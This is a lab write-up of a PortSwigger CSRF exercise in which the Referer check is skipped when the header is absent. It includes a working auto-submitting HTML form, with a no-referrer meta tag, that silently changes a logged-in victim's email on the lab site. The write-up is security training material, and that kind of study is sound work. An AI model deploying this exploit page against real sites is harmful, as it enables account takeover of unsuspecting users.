# CSRF where Referer validation depends on header being present

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

### Analysis/Exploitation -

Login as user `wiener`:

Update the email 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/c4cea6d5-2dc5-4788-a3a5-cf1b7358304b/2024-02-27_15-29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4662SEOAQBH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215502Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHB7VbeMTjISIcpBpFvEtVXFxBdThalz%2BhwfiMMq0%2BQuAiEAgClsoPoRNXbp3WsecCmdGAZw98DRWHoD54JShWIU%2Bv4qiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI2g89nP9kmw7iusdyrcA6QULuh35sot%2BED6FMpEujaVQ7nDeaJxz4a2RCUqBpAT0s9ckj54yA%2FB%2FwwbYjnptLjli5ty9SHTudi%2Fsa6lmGy75OVRmhzFZIY8isDHdC4B8lHsnuPAOdY0L8xwCEQSWcCvHF2nig%2FLH%2F42PD%2Bb%2BGasViArTwjp90%2FJfZUOAIvFGvZPw3Rj5WMtEHiycfSpD3X%2BKPALaUd%2FBeFEOrEtWkPLpAhiNMpNEQeMAKaW5I7m0YpKNGvDwlsPi%2Bq7M7AjfxnCkgVVSWzgv5ID9WlQWWNug9FRiMealsoZrgOy04GAVjY36VUtBo8GTSEvpAB1VdawGrgBBzIa29gaI4RSlS%2BXwwzfclsEqWhPOOCNUadesYuOxn3JVg%2BwJOQNKpNYju1t8S%2FhBbC1hTkr0He8FIrvQ6Sf%2BPbEHiJX4G2K2%2BX4B%2B060ZM5mfOy2KH78usYpuFQiuGIiGGLM8zzK%2B0RbT0NVAXakv3bRK47c%2BLQNke8%2FaGsNz9gOhqtaG4FV2fS%2BGwf0x8gAE7Iqp8XZfBTWaQJI76u%2By16oMcq4hroOPAm0j%2BT9ZFl8TdWfClhm%2BkRYUpOkTlKjA5yCpfuwtUk%2Fv06AzCH%2BVyr19S%2FCM%2FkiTGPPuB3eRwulv8xz%2FZzMIiGo9QGOqUB6%2B8g8H3B%2FiVdbG8gteSJirFA6BlADhhP1iA94S317eZTeJsc6Nt6pv07E1F74Di%2BvoVEuWtrh8jW%2FVueRA2fHbfVbaMDPJ5pa%2Fq%2FCQp2kpEJcCpkemRGhD7Kugr%2FwyT6NwlRkem4QZopuimht9YSjzEj3WjbbesaPP%2FFMFKiYjNK3QUZJYDmQznRgBfDHLJJYwyAsO7m3EoxLTIER0830gZMnSay&X-Amz-Signature=9ddd4ddb3993e1fc1bf7caf92b416cb506b7865324eacc14864defff4d39eecc&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

> 💡 In order for a CSRF attack to be possible:

  - A relevant action: change a users email
  - Cookie-based session handling: session cookie
  - No unpredictable request parameters: no csrf token
**Generate CSRF PoC** (in prof. version.) or  
**craft a HTML form that performs CSRF attack to the victim:**

use the `exploit server` to test CSRF attack!

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/10ba55c1-6334-4b67-90ca-bbc7fb1d9293/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4662SEOAQBH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215502Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHB7VbeMTjISIcpBpFvEtVXFxBdThalz%2BhwfiMMq0%2BQuAiEAgClsoPoRNXbp3WsecCmdGAZw98DRWHoD54JShWIU%2Bv4qiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI2g89nP9kmw7iusdyrcA6QULuh35sot%2BED6FMpEujaVQ7nDeaJxz4a2RCUqBpAT0s9ckj54yA%2FB%2FwwbYjnptLjli5ty9SHTudi%2Fsa6lmGy75OVRmhzFZIY8isDHdC4B8lHsnuPAOdY0L8xwCEQSWcCvHF2nig%2FLH%2F42PD%2Bb%2BGasViArTwjp90%2FJfZUOAIvFGvZPw3Rj5WMtEHiycfSpD3X%2BKPALaUd%2FBeFEOrEtWkPLpAhiNMpNEQeMAKaW5I7m0YpKNGvDwlsPi%2Bq7M7AjfxnCkgVVSWzgv5ID9WlQWWNug9FRiMealsoZrgOy04GAVjY36VUtBo8GTSEvpAB1VdawGrgBBzIa29gaI4RSlS%2BXwwzfclsEqWhPOOCNUadesYuOxn3JVg%2BwJOQNKpNYju1t8S%2FhBbC1hTkr0He8FIrvQ6Sf%2BPbEHiJX4G2K2%2BX4B%2B060ZM5mfOy2KH78usYpuFQiuGIiGGLM8zzK%2B0RbT0NVAXakv3bRK47c%2BLQNke8%2FaGsNz9gOhqtaG4FV2fS%2BGwf0x8gAE7Iqp8XZfBTWaQJI76u%2By16oMcq4hroOPAm0j%2BT9ZFl8TdWfClhm%2BkRYUpOkTlKjA5yCpfuwtUk%2Fv06AzCH%2BVyr19S%2FCM%2FkiTGPPuB3eRwulv8xz%2FZzMIiGo9QGOqUB6%2B8g8H3B%2FiVdbG8gteSJirFA6BlADhhP1iA94S317eZTeJsc6Nt6pv07E1F74Di%2BvoVEuWtrh8jW%2FVueRA2fHbfVbaMDPJ5pa%2Fq%2FCQp2kpEJcCpkemRGhD7Kugr%2FwyT6NwlRkem4QZopuimht9YSjzEj3WjbbesaPP%2FFMFKiYjNK3QUZJYDmQznRgBfDHLJJYwyAsO7m3EoxLTIER0830gZMnSay&X-Amz-Signature=236894ac701fb04142a169ce2063d03315f63d113e27c5773fe3b213349b5b51&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/284bd78e-f50c-4407-a692-7550d0ba1fd0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4662SEOAQBH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215502Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHB7VbeMTjISIcpBpFvEtVXFxBdThalz%2BhwfiMMq0%2BQuAiEAgClsoPoRNXbp3WsecCmdGAZw98DRWHoD54JShWIU%2Bv4qiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI2g89nP9kmw7iusdyrcA6QULuh35sot%2BED6FMpEujaVQ7nDeaJxz4a2RCUqBpAT0s9ckj54yA%2FB%2FwwbYjnptLjli5ty9SHTudi%2Fsa6lmGy75OVRmhzFZIY8isDHdC4B8lHsnuPAOdY0L8xwCEQSWcCvHF2nig%2FLH%2F42PD%2Bb%2BGasViArTwjp90%2FJfZUOAIvFGvZPw3Rj5WMtEHiycfSpD3X%2BKPALaUd%2FBeFEOrEtWkPLpAhiNMpNEQeMAKaW5I7m0YpKNGvDwlsPi%2Bq7M7AjfxnCkgVVSWzgv5ID9WlQWWNug9FRiMealsoZrgOy04GAVjY36VUtBo8GTSEvpAB1VdawGrgBBzIa29gaI4RSlS%2BXwwzfclsEqWhPOOCNUadesYuOxn3JVg%2BwJOQNKpNYju1t8S%2FhBbC1hTkr0He8FIrvQ6Sf%2BPbEHiJX4G2K2%2BX4B%2B060ZM5mfOy2KH78usYpuFQiuGIiGGLM8zzK%2B0RbT0NVAXakv3bRK47c%2BLQNke8%2FaGsNz9gOhqtaG4FV2fS%2BGwf0x8gAE7Iqp8XZfBTWaQJI76u%2By16oMcq4hroOPAm0j%2BT9ZFl8TdWfClhm%2BkRYUpOkTlKjA5yCpfuwtUk%2Fv06AzCH%2BVyr19S%2FCM%2FkiTGPPuB3eRwulv8xz%2FZzMIiGo9QGOqUB6%2B8g8H3B%2FiVdbG8gteSJirFA6BlADhhP1iA94S317eZTeJsc6Nt6pv07E1F74Di%2BvoVEuWtrh8jW%2FVueRA2fHbfVbaMDPJ5pa%2Fq%2FCQp2kpEJcCpkemRGhD7Kugr%2FwyT6NwlRkem4QZopuimht9YSjzEj3WjbbesaPP%2FFMFKiYjNK3QUZJYDmQznRgBfDHLJJYwyAsO7m3EoxLTIER0830gZMnSay&X-Amz-Signature=726b1b886dceb743f18f5d28c74a05ffc2369d84be2b5572d5533bb3d9dda53f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/49d61922-5ef6-44ef-bd44-dce28f076652/2024-02-27_15-45.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4662SEOAQBH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215502Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHB7VbeMTjISIcpBpFvEtVXFxBdThalz%2BhwfiMMq0%2BQuAiEAgClsoPoRNXbp3WsecCmdGAZw98DRWHoD54JShWIU%2Bv4qiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI2g89nP9kmw7iusdyrcA6QULuh35sot%2BED6FMpEujaVQ7nDeaJxz4a2RCUqBpAT0s9ckj54yA%2FB%2FwwbYjnptLjli5ty9SHTudi%2Fsa6lmGy75OVRmhzFZIY8isDHdC4B8lHsnuPAOdY0L8xwCEQSWcCvHF2nig%2FLH%2F42PD%2Bb%2BGasViArTwjp90%2FJfZUOAIvFGvZPw3Rj5WMtEHiycfSpD3X%2BKPALaUd%2FBeFEOrEtWkPLpAhiNMpNEQeMAKaW5I7m0YpKNGvDwlsPi%2Bq7M7AjfxnCkgVVSWzgv5ID9WlQWWNug9FRiMealsoZrgOy04GAVjY36VUtBo8GTSEvpAB1VdawGrgBBzIa29gaI4RSlS%2BXwwzfclsEqWhPOOCNUadesYuOxn3JVg%2BwJOQNKpNYju1t8S%2FhBbC1hTkr0He8FIrvQ6Sf%2BPbEHiJX4G2K2%2BX4B%2B060ZM5mfOy2KH78usYpuFQiuGIiGGLM8zzK%2B0RbT0NVAXakv3bRK47c%2BLQNke8%2FaGsNz9gOhqtaG4FV2fS%2BGwf0x8gAE7Iqp8XZfBTWaQJI76u%2By16oMcq4hroOPAm0j%2BT9ZFl8TdWfClhm%2BkRYUpOkTlKjA5yCpfuwtUk%2Fv06AzCH%2BVyr19S%2FCM%2FkiTGPPuB3eRwulv8xz%2FZzMIiGo9QGOqUB6%2B8g8H3B%2FiVdbG8gteSJirFA6BlADhhP1iA94S317eZTeJsc6Nt6pv07E1F74Di%2BvoVEuWtrh8jW%2FVueRA2fHbfVbaMDPJ5pa%2Fq%2FCQp2kpEJcCpkemRGhD7Kugr%2FwyT6NwlRkem4QZopuimht9YSjzEj3WjbbesaPP%2FFMFKiYjNK3QUZJYDmQznRgBfDHLJJYwyAsO7m3EoxLTIER0830gZMnSay&X-Amz-Signature=23a4731cf7462c806d842b126d11b89e9a1ab41a26d02e2a3e0db7ac109da0a3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Since the `Referer` HTTP header can be fully controlled by the attacker, we can bypass this check!

send this request into Repeater and simply remove the referrer header, 

The request goes through and the email gets changed

In this case I need to coerce the browser of the victim to not send the referrer header.

> 💡 **According to **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)**, we can use the **`<meta>`** tag to ignore **`Referer`** HTTP header:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051342.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051352.png)

**To bypass that, add a new **`<meta>`** tag to ignore **`Referer`** header:**

 integrate directive into the HTML code itself:

```html
<html>
  <head>
	    <meta name="referrer" content="no-referrer">
    </head>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2b0080046a2b6781242625009d001c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test1&#64;domain&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/f91b02fc-1932-415d-9fbe-0af59f93a9c2/2024-02-27_16-07.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4662SEOAQBH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215502Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHB7VbeMTjISIcpBpFvEtVXFxBdThalz%2BhwfiMMq0%2BQuAiEAgClsoPoRNXbp3WsecCmdGAZw98DRWHoD54JShWIU%2Bv4qiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI2g89nP9kmw7iusdyrcA6QULuh35sot%2BED6FMpEujaVQ7nDeaJxz4a2RCUqBpAT0s9ckj54yA%2FB%2FwwbYjnptLjli5ty9SHTudi%2Fsa6lmGy75OVRmhzFZIY8isDHdC4B8lHsnuPAOdY0L8xwCEQSWcCvHF2nig%2FLH%2F42PD%2Bb%2BGasViArTwjp90%2FJfZUOAIvFGvZPw3Rj5WMtEHiycfSpD3X%2BKPALaUd%2FBeFEOrEtWkPLpAhiNMpNEQeMAKaW5I7m0YpKNGvDwlsPi%2Bq7M7AjfxnCkgVVSWzgv5ID9WlQWWNug9FRiMealsoZrgOy04GAVjY36VUtBo8GTSEvpAB1VdawGrgBBzIa29gaI4RSlS%2BXwwzfclsEqWhPOOCNUadesYuOxn3JVg%2BwJOQNKpNYju1t8S%2FhBbC1hTkr0He8FIrvQ6Sf%2BPbEHiJX4G2K2%2BX4B%2B060ZM5mfOy2KH78usYpuFQiuGIiGGLM8zzK%2B0RbT0NVAXakv3bRK47c%2BLQNke8%2FaGsNz9gOhqtaG4FV2fS%2BGwf0x8gAE7Iqp8XZfBTWaQJI76u%2By16oMcq4hroOPAm0j%2BT9ZFl8TdWfClhm%2BkRYUpOkTlKjA5yCpfuwtUk%2Fv06AzCH%2BVyr19S%2FCM%2FkiTGPPuB3eRwulv8xz%2FZzMIiGo9QGOqUB6%2B8g8H3B%2FiVdbG8gteSJirFA6BlADhhP1iA94S317eZTeJsc6Nt6pv07E1F74Di%2BvoVEuWtrh8jW%2FVueRA2fHbfVbaMDPJ5pa%2Fq%2FCQp2kpEJcCpkemRGhD7Kugr%2FwyT6NwlRkem4QZopuimht9YSjzEj3WjbbesaPP%2FFMFKiYjNK3QUZJYDmQznRgBfDHLJJYwyAsO7m3EoxLTIER0830gZMnSay&X-Amz-Signature=604e4fc8bbba3155f2f075ee6694a53a2ed5c40cb1beb0f1d6daaa3bbb1c6b04&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

or As an alternative, update exploit page header with the relevant syntax:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e1cd84d1-fe2e-4ac3-bbc1-2a85212aa532/2024-02-27_16-05.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4662SEOAQBH%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215502Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHB7VbeMTjISIcpBpFvEtVXFxBdThalz%2BhwfiMMq0%2BQuAiEAgClsoPoRNXbp3WsecCmdGAZw98DRWHoD54JShWIU%2Bv4qiAQIrv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDI2g89nP9kmw7iusdyrcA6QULuh35sot%2BED6FMpEujaVQ7nDeaJxz4a2RCUqBpAT0s9ckj54yA%2FB%2FwwbYjnptLjli5ty9SHTudi%2Fsa6lmGy75OVRmhzFZIY8isDHdC4B8lHsnuPAOdY0L8xwCEQSWcCvHF2nig%2FLH%2F42PD%2Bb%2BGasViArTwjp90%2FJfZUOAIvFGvZPw3Rj5WMtEHiycfSpD3X%2BKPALaUd%2FBeFEOrEtWkPLpAhiNMpNEQeMAKaW5I7m0YpKNGvDwlsPi%2Bq7M7AjfxnCkgVVSWzgv5ID9WlQWWNug9FRiMealsoZrgOy04GAVjY36VUtBo8GTSEvpAB1VdawGrgBBzIa29gaI4RSlS%2BXwwzfclsEqWhPOOCNUadesYuOxn3JVg%2BwJOQNKpNYju1t8S%2FhBbC1hTkr0He8FIrvQ6Sf%2BPbEHiJX4G2K2%2BX4B%2B060ZM5mfOy2KH78usYpuFQiuGIiGGLM8zzK%2B0RbT0NVAXakv3bRK47c%2BLQNke8%2FaGsNz9gOhqtaG4FV2fS%2BGwf0x8gAE7Iqp8XZfBTWaQJI76u%2By16oMcq4hroOPAm0j%2BT9ZFl8TdWfClhm%2BkRYUpOkTlKjA5yCpfuwtUk%2Fv06AzCH%2BVyr19S%2FCM%2FkiTGPPuB3eRwulv8xz%2FZzMIiGo9QGOqUB6%2B8g8H3B%2FiVdbG8gteSJirFA6BlADhhP1iA94S317eZTeJsc6Nt6pv07E1F74Di%2BvoVEuWtrh8jW%2FVueRA2fHbfVbaMDPJ5pa%2Fq%2FCQp2kpEJcCpkemRGhD7Kugr%2FwyT6NwlRkem4QZopuimht9YSjzEj3WjbbesaPP%2FFMFKiYjNK3QUZJYDmQznRgBfDHLJJYwyAsO7m3EoxLTIER0830gZMnSay&X-Amz-Signature=94d3f8fcc607bbbcdb96266e49dd35be47bbfd7b41aff48c9d6d07b5633bddf6&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
